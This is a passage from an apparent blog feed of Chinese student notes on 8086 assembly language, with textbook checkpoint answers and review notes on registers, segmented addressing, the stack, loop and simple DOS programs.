    
  </entry>
  
  
  
  <entry>
    <title>汇编语言检测点</title>
    <link href="/2023/05/27/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%A3%80%E6%B5%8B%E7%82%B9/"/>
    <url>/2023/05/27/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%A3%80%E6%B5%8B%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="第一章-基础知识">第一章 基础知识</h2><h3 id="检测点-1.1">检测点 1.1</h3><p><a href="https://freeimage.host/i/HrT21vs"><imgsrc="https://iili.io/HrT21vs.md.png" alt="HrT21vs.md.png" /></a></p><p>（1）<strong>13</strong></p><ul><li>寻址能力：一个CPU有N根地址线，则这个CPU的地址总线的宽度为N，最多可以寻找2的N次方个内存单元。</li><li>地址总线的宽度决定了CPU 的寻址能力。</li><li>\( 2^{N} = 8KB = 8*1024B = 2^{13}B \)，N为地址总线宽度，N=13</li></ul><p>（2）<strong>1024，0，1023</strong> -一个存储单元占一个字节（即1B），故1KB的存储器有1024个存储单元，存储单元编号从0~1023。</p><p>（3）<strong>8192，1024</strong> - 1千字节（KB）= 1024字节（B） -1字节（Byte）= 8比特（bit）</p><p>（4）<strong>\( 2^{30}， 2^{20}， 2^{10}\)</strong></p><p>（5）<strong>64KB，1MB，16MB，4GB</strong> -8080CPU地址总线宽度为16，寻址能力为\(2^{16} = 2^6KB = 64KB\) -其余同理</p><p>（6）<strong>1，1，2，2，4</strong> -8根数据总线一次可传送一个8位二进制数据（即一个字节）</p><p>（7）<strong>512，256</strong> - 8086CPU数据总线16根，一次可读2个字节,1024/2=512</p><p>（8）<strong>二进制</strong></p><h2 id="第二章-寄存器">第二章 寄存器</h2><h3 id="检测点-2.1">检测点 2.1</h3><p><a href="https://freeimage.host/i/H4naDZb"><imgsrc="https://iili.io/H4naDZb.md.png" alt="H4naDZb.md.png" /></a></p><ol type="1"><li><p>有点简单，注意溢出即可，如：C5H+93H=158H，而al只有8位，所以al=58H，从而AX=0058H</p></li><li><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mov</span> ax,<span class="hljs-number">2</span>     ;<span class="hljs-number">2</span>的<span class="hljs-number">1</span>次方 = <span class="hljs-number">2</span><br><span class="hljs-attribute">add</span> ax,ax    ;<span class="hljs-number">2</span>的<span class="hljs-number">2</span>次方 = <span class="hljs-number">2</span> + <span class="hljs-number">2</span> = <span class="hljs-number">4</span><br><span class="hljs-attribute">add</span> ax,ax    ;<span class="hljs-number">2</span>的<span class="hljs-number">3</span>次方 = <span class="hljs-number">4</span> + <span class="hljs-number">4</span> = <span class="hljs-number">8</span><br><span class="hljs-attribute">add</span> ax,ax    ;<span class="hljs-number">2</span>的<span class="hljs-number">4</span>次方 = <span class="hljs-number">8</span> + <span class="hljs-number">8</span> = <span class="hljs-number">16</span><br></code></pre></td></tr></table></figure><h3 id="检测点-2.2">检测点 2.2</h3><p><a href="https://freeimage.host/i/H4pjm0v"><imgsrc="https://iili.io/H4pjm0v.md.png"alt="H4pjm0v.md.png" /></a></p></li></ol><p>（1）<strong>00010H到1000FH</strong> - 基础地址（段地址*16）+偏移地址 = 物理地址 -偏移地址16位，变化范围为0~FFFFH，仅用偏移地址最多可寻址64KB -给定段地址为0001H，寻址范围为（0001H×16）+0到（0001H×16）+FFFFH，即寻址范围为0010H到1000FH</p><p>（2）<strong>最小为 1001H ，最大为 2000H</strong></p><ul><li>段地址<em>16+偏移地址=物理地址，即SA</em>16+EA=20000H；偏移地址16位，变化范围为0~FFFFH；</li><li>当偏移地址取最大值FFFFH时，段地址最小，SA=(20000H-FFFFH)/16=1001H（<strong>取上界</strong>）</li><li>当偏移地址取最小值0H时，段地址最大，SA=(20000H-0H)/16=2000H。</li></ul><p>思考：当段地址给定为小于1001H或大于2000H时，CPU无论怎么变化偏移地址都无法寻到20000H单元。</p><h3 id="检测点-2.3">检测点 2.3</h3><p><a href="https://freeimage.host/i/H4pvW0u"><imgsrc="https://iili.io/H4pvW0u.md.png" alt="H4pvW0u.md.png" /></a></p><ul><li><p>一共修改了4次。</p></li><li><p>读取 mov ax,bx 指令后，第一次修改IP</p></li><li><p>读取 sub ax,ax 指令后，第二次修改IP</p></li><li><p>读取 jmp ax 指令后，第三次修改IP</p></li><li><p>执行 jmp ax 指令时，第四次修改IP，最后IP=ax=0</p><p><strong>略了，有时间再补，最近期末复习时间太紧了</strong></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>汇编</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编语言知识点复习</title>
    <link href="/2023/05/27/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%9F%A5%E8%AF%86%E7%82%B9%E5%A4%8D%E4%B9%A0/"/>
    <url>/2023/05/27/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%9F%A5%E8%AF%86%E7%82%B9%E5%A4%8D%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405091654440.jpeg"alt="王爽-汇编语言" /><figcaption aria-hidden="true">王爽-汇编语言</figcaption></figure><h2 id="tips">tips</h2><ul><li><strong>使用debug××.exe调试时，首次进入调试界面时，寄存器CX中存放的是可执行文件长度。</strong></li><li>inc bx 等价于add bx,1</li><li>XOR操作是一种逻辑运算符，用于执行异或操作，英文全称是 exclusiveor。XOR 操作的结果是两个二进制位相同则结果为 0，否则结果为 1。例如 XORAX, AX 可以将 AX 寄存器中的值清零。</li><li>在汇编源程序中，数据不能以字母开头</li><li>遇到loop指令时，使用P命令来执行。Debug就会自动重复执行循环中的指令，直到(cx)=0为止</li><li>DOSBOX中，int 21 后面要用 p 指令来结束。</li><li>dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h<ul><li><strong>“dw”</strong>的含义是定义字型数据。dw即“define word”。</li><li>在这里，使用dw定义了8个字型数据（数据之间以逗号分隔），它们所占的内存空间的大小为16个字节</li></ul></li><li>db 字节型，dd双字型</li><li>通过<strong>DS=0B2D</strong>，可以知道程序从<strong>0B3D:0000</strong>开始存放</li><li>NOT 实现按位取反，例如(AL)=00010010B，则 NOT AL使得（AL）=11101101B。XOR 为异或运算。</li><li><strong>var dd 252 dup(10)</strong><ul><li>var dd 252 dup(10) 是一种伪指令，用于在汇编语言中定义一个名为 var的变量，并初始化它为重复出现的值。</li><li>根据这个伪指令的语法，252 是要重复的次数，dup(10) 表示要重复的值为10。因此，该指令的作用是将值为 10 的双字型数据重复 252次，然后存储到名为 var 的变量中。</li></ul></li><li>VAR3 DB 'HOW ARE YOU?','$'，，，VAR3 = 13 字节 (12 + 1)</li><li>VAR2 DW 5DUP(?),0，，，，，VAR2 = 12 字节 (5 * 2 + 2)</li><li>段地址（SA）Segment Address 和 偏移地址（EA）Effective Address</li><li>要用八位二进制表示 -9 的补码，可以按照以下步骤进行计算：<ul><li>将 -9 的<strong>绝对值</strong>转换为二进制。9 的二进制表示为00001001。</li><li>获取 9 的反码。即将二进制数的每一位取反，得到 11110110。</li><li>将反码加 1 得到补码。在这种情况下，11110110 + 1 = 11110111。</li><li>因此，-9 在八位二进制补码表示中为 11110111。十六进制为F7</li></ul></li><li>dec bx ;dec指令和inc指令的功能相反，dec bx 进行操作为：(bx) = (bx) -1</li><li><strong>mul是乘法指令</strong>，使用 mul 做乘法的时候：<ul><li>相乘的两个数：要么都是8位，要么都是16位。<ul><li>8 位：一个默认放在 AL中 ，另一个放在8位寄存器或内存字节单元中；</li><li>16 位： 一个默认放在AX中，另一个放在16 位寄存器或内存字单元中。</li></ul></li><li>结果<ul><li>8位：AX中；</li><li>16位：DX（高位）和AX（低位）中。</li></ul></li><li>格式如下：<ul><li>mul reg</li><li>mul 内存单元</li></ul></li><li>比如：mul byte ptr ds:[0]<ul><li>含义为： (ax)=(al) * ((ds) * 16+0)</li></ul></li><li>mul word ptr [bx+si+8]<ul><li>含义为：</li><li>(ax)=(ax) * ((ds) * 16+(bx)+(si)+8)结果的低16位；</li><li>(dx)=(ax) * ((ds) * 16+(bx)+(si)+8)结果的高16位；</li></ul></li></ul></li><li>小写字母的ASCII码范围61H-7AH</li><li>一般情况下：从<strong>0000:0200至0000:02FF</strong>的256个字节的空间所对应的中断向量表项都是空的，操作系统和其他应用程序都不占用</li><li>(IP) = 5，说明 ss:sp = 5，</li></ul><h2 id="第1章-基础知识">第1章 基础知识</h2><hr /><h3 id="基础概念">基础概念</h3><ol type="1"><li>每一种微处理器，由于硬件设计和内部结构的不同，就需要用不同的电平脉冲来控制，使它工作。所以每一种微处理器都有自己的机器指令集，也就是机器语言。</li><li>汇编语言的主体是汇编指令。</li><li>汇编指令和机器指令的差别在于指令的表示方法上，汇编指令是机器指令便于记忆的书写格式。汇编指令是机器指令的助记符。</li><li>汇编语言由以下3类指令组成：<ol type="1"><li>汇编指令：机器码的助记符，有对应的机器码。</li><li>伪指令：由编译器执行，没有对应的机器码，计算机并不执行。</li><li>其他符号：如+、-、*、/等，由编译器识别，没有对应的机器码。</li></ol></li><li>CPU要想进行数据的读写，必须和外部器件（标准的说法是芯片）进行三类信息的交互：<ol type="1"><li>存储单元的地址（地址信息）；</li><li>器件的选择，读或写命令（控制信息）；</li><li>读或写的数据（数据信息）。</li></ol></li><li>CPU是通过<strong>地址总线</strong>来指定存储器单元的。地址总线上能传送多少个不同的信息，CPU就可以对多少个存储单元进行寻址。</li><li>CPU与内存或其它器件之间的数据传送是通过<strong>数据总线</strong>来进行的。数据总线的宽度决定了CPU和外界的数据传送速度。</li><li>8088CPU数据总线宽度为8，<strong>8086CPU</strong>数据总线宽度为16。</li><li><strong>控制总线</strong>：有多少根控制总线，就意味着CPU提供了对外部器件的多少种控制。所以，控制总线的宽度决定了CPU对外部器件的控制能力。</li></ol><ul><li>前面所讲的内存读或写命令是由几根控制线综合发出的：其中有一根名为读信号输出控制线负责由CPU向外传送读信号，CPU向该控制线上输出<strong>低电平</strong>表示将要读取数据；</li></ul><ol type="1"><li><p>b：bit，B：Byte</p></li><li><p>1B = 8b，1KB = 1024B，1MB = 1024KB，1GB = 1024MB</p></li><li><p>将各类存储器看作一个逻辑存储器：所有的物理存储器被看作一个由若干存储单元组成的逻辑存储器；每个物理存储器在这个逻辑存储器中占有一个地址段，即一段地址空间；CPU在这段地址空间中读写数据，实际上就是在相对应的物理存储器中读写数据。</p></li><li><p>8086PC机的内存地址空间分配：</p><p><a href="https://freeimage.host/cn"><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405091507813.png"alt="H4BhK0b.png" /></a></p></li><li><p>图 1.9 告诉我们，从地址 0 ~ 9FFFF的内存单元中读取数据，实际上就是在读取主随机存储器中的数据；向地址 A0000~ BFFFF的内存单元中写数据，就是向显存中写入数据,这些数据会被显示卡输出到显示器上；我们向地址CO00O ~ FFFFF的内存单元中写入数据的操作是<em>无效的</em>，因为这等于改写只读存储器中的内容。</p></li><li><p>内存地址空间：最终运行程序的是CPU，我们用汇编编程的时候，必须要从CPU角度考虑问题。对CPU来讲，系统中的所有存储器中的存储单元都处于一个统一的逻辑存储器中，它的容量受CPU寻址能力的限制。这个逻辑存储器即是我们所说的<em>内存地址空间</em>。😭</p></li></ol><blockquote><p>牢🐏，this is for you，2024.05.09</p></blockquote><h2 id="第2章-寄存器">第2章 寄存器</h2><hr /><h3 id="基础概念-1">基础概念</h3><ol type="1"><li><p>8086CPU有14个寄存器，它们的名称为：AX、BX、CX、DX、SI、DI、SP、BP、IP、CS、SS、DS、ES、PSW。</p><blockquote><p>AX：accumulator register，累加器寄存器</p><p>BX： base register，基数寄存器</p><p>CX： count register，计数寄存器</p><p>DX：data register，通用数据寄存器</p><p>SI：source index，源变址寄存器</p><p>DI：destination index，目的变址寄存器</p><p>SP：stack pointer，堆栈指针寄存器</p><p>BP：basepointer，基址指针寄存器，指示堆栈段中一个数据区的基址位置，通常与SS配对</p><p>IP：instruction pointer，码段地址指针寄存器</p><p>CS：code segment，代码段寄存器</p><p>SS：stack segment，堆栈段~，存放当前堆栈段的段地址，一般和SP连用</p><p>DS：data segment，数据段~，存放当前数据段的段地址</p><p>ES：extra segment，附加段~</p><p>PSW：program state word，标志~</p></blockquote></li><li><p>8086CPU所有的寄存器都是16位的，可以存放两个字节。</p></li><li><p>AX、BX、CX、DX通常用来存放一般性数据，被称为通用寄存器。</p></li><li><p>一个16位寄存器所能存储的数据的最大值为多少？ 答案：<spanclass="math inline">\(2^{16}-1=65535。\)</span></p></li><li><p>汇编指令不区分大小写。</p></li><li><p>8086有20位地址总线，可传送20位地址，寻址能力为1M。</p></li><li><p>地址加法器如何完成段地址×16的运算？就是将以二进制形式存放的段地址左移4位。</p></li><li><p>“段地址×16+偏移地址=物理地址”的本质含义是： CPU在访问内存时，用一个基础地址(段地址x16)和一个相对于基础地址的偏移地址相加，给出内存单元的物理地址。</p></li><li><p>有两点需要注意：段地址✖16 必然是 16的倍数，所以一个段的起始地址也一定是 16 的倍数；偏移地址为 16 位，16位地址的寻址能力为 64KB，所以<em>一个段的长度最大为 64KB</em>。</p></li><li><p>CS和IP是8086CPU中最关键的寄存器，它们指示了CPU当前要读取指令的地址。</p></li><li><p>8086PC工作过程的简要描述</p><ol type="1"><li>从CS:IP指向内存单元读取指令，读取的指令进入指令缓冲器；</li><li>IP = IP + 所读取指令的长度，从而指向下一条指令；</li><li>执行指令。 转到步骤 （1），重复这个过程。</li></ol></li><li><p><strong>mov指令不能用于设置CS、IP的值，8086CPU没有提供这样的功能。</strong></p></li></ol><h2 id="第3章-寄存器内存访问">第3章 寄存器（内存访问）</h2><hr /><h3 id="基础概念-2">基础概念</h3><ol type="1"><li>8086CPU不支持将数据直接送入段寄存器的操作，ds是一个段寄存器。（硬件设计的问题）</li></ol><ul><li>mov ds,1000H 是非法的。</li><li>数据 → 一般的寄存器 → 段寄存器</li></ul><ol start="2" type="1"><li><p><strong>字在内存中存储时，要用两个地址连续的内存单元来存放，字的低位字节存放在低地址单元中，高位字节存放再高地址单元中。</strong></p></li><li><p>合法格式：</p></li></ol><ul><li>mov 寄存器，寄存器/内存单元/段寄存器/立即数</li><li>mov 内存单元，寄存器/段寄存器/立即数</li><li>mov 段寄存器，寄存器/内存单元 ~注意：</li><li>mov指令中的目的操作数不能是立即数、IP和CS寄存器；</li><li>mov指令中不允许在两个存储单元之间直接传送数据；</li><li>mov指令中不允许在两个段寄存器之间直接传送数据；</li><li>mov指令中立即数不能直接传送给段寄存器（CS、DS、SS、ES）。</li></ul><ol start="4" type="1"><li>栈：</li></ol><ul><li><p>8086CPU提供了栈操作机制，方案如下：在SS，SP中存放栈顶的段地址和偏移地址；提供入栈和出栈指令，他们根据SS:SP指示的地址，按照栈的方式访问内存单元。</p></li><li><p><strong>push指令的执行步骤</strong>：</p><ol type="1"><li><p>SP=SP-2；</p></li><li><p>向SS:SP指向的字单元中送入数据。</p></li></ol></li><li><p><strong>pop指令的执行步骤</strong>：</p><ol type="1"><li>从SS:SP指向的字单元中读取数据；</li><li>SP=SP+2。</li></ol></li><li><p>任意时刻，SS:SP指向栈顶元素。</p></li><li><p>8086CPU只记录栈顶，栈空间的大小我们要自己管理。</p></li><li><p>用栈来暂存以后需要恢复的寄存器的内容时 ，寄存器出栈的顺序要和入栈的顺序相反。</p></li><li><p>push、pop实质上是一种内存传送指令，注意它们的灵活应用。</p></li></ul><ol type="1"><li><p>一个栈段的容量最大为64KB。</p></li><li><p>如果我们将10000H~1FFFFH这段空间当作栈段，初始状态是空的，此时，SS=1000H，SP=？、、、</p><p>答案：0，（SP原来为FFFEH，加2后SP=0，所以，当栈为空的时候，SS=1000H，SP=0。）</p></li><li><p><strong>我们可以将一段内存定义为一个段，用一个段地址指示段，用偏移地址访问段内的单元。这完全是我们自己的安排。</strong></p><ul><li>我们可以用一个段存放数据，将它定义为“数据段”</li><li>我们可以用一个段存放代码，将它定义为“代码段”</li><li>我们可以用一个段当作栈，将它定义为“栈段”</li></ul><p>我们可以这样安排，但若要让CPU按照我们的安排来访问这些段，就要：</p><ul><li>对于数据段，将它的段地址放在DS中，用mov、add、sub等访问内存单元的指令时，CPU就将我们定义的数据段中的内容当作数据来访问；</li><li>对于代码段，将它的段地址放在CS中，将段中第一条指令的偏移地址放在IP中，这样CPU就将执行我们定义的代码段中的指令；</li><li>对于栈段，将它的段地址放在SS中，将栈顶单元的偏移地置放在 SP中，这样CPU在需要进行栈操作的时候，比如执行 push、pop指令等，就将我们定义的栈段当作栈空间来用。</li><li>可见，不管我们如何安排 ，CPU 将内存中的某段内存当作代码，是因为CS:IP指向了那里；CPU将某段内存当作栈 ，是因为 SS:SP指向了那里。</li></ul></li></ol><h2 id="第4章-第一个程序">第4章 第一个程序</h2><hr /><h3 id="基础概念-3">基础概念</h3><ol type="1"><li><p>DOS系统中.EXE文件中的程序的加载过程：</p><p><a href="https://freeimage.host/i/H6suidv"><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405091507784.png"alt="H6suidv.md.png" /></a></p></li><li><p>程序加载后，ds中存放着程序所在内存区的段地址，这个内存区的偏移地址为0 ，则<strong>程序所在的内存区的地址为：ds:0</strong>；这个内存区的前256个字节中存放的是PSP，dos用来和程序进行通信。 从256字节处向后的空间存放的是程序。</p></li><li><p>所以，我们从ds中可以得到PSP的段地址SA，PSP的偏移地址为0，则物理地址为SA×16+0。因为PSP占256（100H）字节，所以<strong>程序的物理地址</strong>是：<em>SA×16+0+256=SA×16+16×16=（SA+16）×16+0</em>可用段地址和偏移地址表示为：<strong>SA+10:0</strong>。</p><ul><li>如：DS=129E，则PSP的的地址为129E:0，程序的地址为12AE:0。</li></ul></li><li><p>一个源程序从写出到执行的过程：<strong>编写、编译、连接、执行</strong>（使用汇编语言编译程序对源程序文件中的源程序进行编译，产生目标文件；再用连接程序对目标文件进行连接，生成可在操作系统中直接运行的可执行文件。）</p></li><li><p>说明<strong>伪指令和汇编指令的区别</strong>：汇编指令是有对应的机器码的指令，可以被编译为机器指令，最终为CPU所执行。而伪指令没有对应的机器指令，最终不被CPU所执行，是由编译器来执行的。</p></li><li><p>说明汇编语言程序中<strong>标号的作用</strong>：汇编源程序中一个标号指代了一个地址，比如codesg在segment的前面，作一个段的名称，这个段的名称最终将被编译、连接程序处理为一个段的段地址。</p></li></ol><h2 id="第5章-bx和loop指令">第5章 [bx]和loop指令</h2><hr /><h3 id="基础概念-4">基础概念</h3><ol type="1"><li>描述性符号“()”，例如：对于push ax的功能，我们可以这样来描述：<ul><li>(sp) = (sp)-2</li><li>((ss) * 16＋(sp))=(ax)</li></ul></li><li>(2000:0)、((ds):1000H)等是错误的用法</li><li>(ax)、(ds)、(al)、(2000H)、((ds) * 16+(bx))等是正确的用法</li><li>指令的格式是：loop 标号，CPU 执行loop指令的时候，要进行两步操作：<ol type="1"><li>(cx)=(cx)-1；</li><li>判断cx中的值，不为零则转至标号处执行程序，如果为零则向下执行。</li></ol></li><li>ffff:0006 单元中的数是一个字节型的数据，范围在0~255之间</li><li><strong>我们在Debug中写过类似的指令：<code>mov ax,[0]</code>表示将ds:0处的数据送入ax中。但是在汇编源程序中，指令<code>mov ax,[0]</code>被编译器当作指令<code>mov ax,0</code>处理。</strong></li><li>为防止上述情况发生，在源程序中，可采用两种方法访问2000:0单元：</li></ol><ul><li><p>方法一：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">2000h</span> <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span> <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0</span> <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,[<span class="hljs-built_in">bx</span>]<br><br>X86ASM<br></code></pre></td></tr></table></figure></li><li><p>方法二：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">2000h</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span>    <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-built_in">ds</span>:[<span class="hljs-number">0</span>]                 一般用第二种方法<br><br>X86ASM<br></code></pre></td></tr></table></figure></li></ul><ol type="1"><li>DOS方式下，一般情况， 0:200 ~ 0:2FF空间中没有系统或其他程序的数据或代码；以后，我们需要直接向一段内存中写入内容时，就使用0:200~ 0:2FF这段空间。</li><li>利用栈对CX寄存器内容进行保护push和恢复pop可以实现多重loop循环。如：</li></ol><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>, m<br><span class="hljs-symbol">s1:</span>          <span class="hljs-comment">;循环体1</span><br> <span class="hljs-keyword">push</span> <span class="hljs-built_in">cx</span><br> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,n<br><span class="hljs-symbol">s2:</span>          <span class="hljs-comment">;循环体2</span><br> <span class="hljs-keyword">loop</span> s2<br> <span class="hljs-keyword">pop</span> <span class="hljs-built_in">cx</span><br> <span class="hljs-keyword">loop</span> s1<br><br>X86ASM<br></code></pre></td></tr></table></figure><h3 id="程序">程序</h3><ol type="1"><li>将内存ffff:0~ffff:b段单元中的数据拷贝到 0:200~0:20b单元中。</li></ol><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code<br><br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">start:</span>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,offffh<br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0020h</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span><br><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">12</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">    s:</span>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-built_in">ds</span>:[<span class="hljs-built_in">bx</span>]<br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">bx</span>],<span class="hljs-built_in">al</span>    <span class="hljs-comment">;al作为中转寄存器</span><br><br>        <span class="hljs-keyword">inc</span> <span class="hljs-built_in">bx</span><br>        <span class="hljs-keyword">loop</span> s<br>        <br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br>        <span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br><br>code ends<br>end start<br><br><br>X86ASM<br></code></pre></td></tr></table></figure><ol type="1"><li>编写程序片断，利用 loop 指令，实现斐波那契数列前 9 个数字1、1、2、3、5、8、13、21、34 的求和，并将求和结果保存到内存字单元 0:200中</li></ol><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code<br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0</span>    <span class="hljs-comment">;ax中的值依次为1、1、2、3、5、8、13、21、34      </span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">1</span><br> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dx</span>,<span class="hljs-number">0</span>    <span class="hljs-comment">;来存最后的计算结果</span><br> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">9</span>    <span class="hljs-comment">;循环次数</span><br><span class="hljs-symbol"> s:</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">bx</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">bx</span>,<span class="hljs-built_in">ax</span><br> <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ax</span><br> <span class="hljs-keyword">add</span> <span class="hljs-built_in">dx</span>,<span class="hljs-built_in">ax</span><br><br> <span class="hljs-keyword">loop</span> s<br> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0</span><br> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>:[<span class="hljs-number">200h</span>],<span class="hljs-built_in">dx</span><br> <br> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br> <span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br><br>code ends<br>end start<br><br><br>X86ASM<br></code></pre></td></tr></table></figure><h2 id="第6章-包含多个段的程序">第6章 包含多个段的程序</h2><hr /><h3 id="基础概念-5">基础概念</h3><ol type="1"><li>我们在源程序中用伪指令 “assumecs:code,ds:data,ss:stack”将cs、ds和ss分别和code、data、stack段相连。这样做了之后，CPU是否就会将cs指向ode，ds 指向 data，ss指向stack，从而按照我们的意图来处理这些段呢？</li><li>当然也不是，要知道 assume是伪指令，是由编译器执行的，也是仅在源程序中存在的信息，CPU并不知道它们。我们不必深究assume的作用，只要知道需要用它将你定义的具有一定用途的段和相关的寄存器联系起来就可以了。</li><li>若要CPU按照我们的安排行事，就要用机器指令控制它，源程序中的汇编指令是CPU要执行的内容。</li><li>总之，CPU到底如何处理我们定义的段中的内容，是当作指令执行，当作数据访问，还是当作栈空间，完全是靠程序中具体的汇编指令，和汇编指令对CS:IP、SS:SP、DS等寄存器的设置来决定的。</li></ol><h2 id="第7章-更灵活的定位内存地址的的方法">第7章更灵活的定位内存地址的的方法</h2><hr /><h3 id="基础概念-6">基础概念</h3><ol type="1"><li>（1）and 指令：逻辑与指令，按位进行与运算。（2）or指令：逻辑或指令，按位进行或运算。</li><li>在ASCII编码方案中，用61H 表示“a”，62H表示“b”。用41H表示“A”，42H表示“B”。</li><li>就ASCII码的二进制形式来看，除第5位（位数从0开始计算）外，大写字母和小写字母的其他各位都一样。大写字母ASCII码的第5位（位数从0开始计算）为0，小写字母的第5位为1。</li><li>or al,00100000b ;将al中的ASCII码的第5位置为1，变为小写字母</li><li>and al,11011111b ;将al中的ASCII码的第5位置为0，变为大写字母<ul><li><strong>and byte ptr[si],11011111b</strong>，等到了后面就是这样了</li></ul></li><li>指令<strong>mov ax,[bx+200]也可以写成如下格式（常用）</strong>：<ul><li>mov ax,[200+bx]</li><li><strong>mov ax,200[bx]</strong></li><li>mov ax,[bx].200</li></ul></li><li>SI(source index register)和DI(destination indexregister)是8086CPU中和bx功能相近的寄存器，<strong>SI和DI不能够分成两个8位寄存器来使用</strong>。</li><li>指令mov ax,[bx+si]的数学化的描述为：(ax)=( (ds) * 16+(bx)+(si) )。该指令也可以写成如下格式（常用）：mov ax,[bx][si]</li><li>指令mov ax,[bx+si+200]，该指令也可以写成如下格式（常用）：<ul><li>mov ax,[bx+200+si]</li><li>mov ax,[200+bx+si]</li><li>mov ax,200[bx][si]</li><li>mov ax,[bx].200[si]</li><li>mov ax,[bx][si].200</li></ul></li></ol><h2 id="第8章-数据处理的两个基本问题">第8章 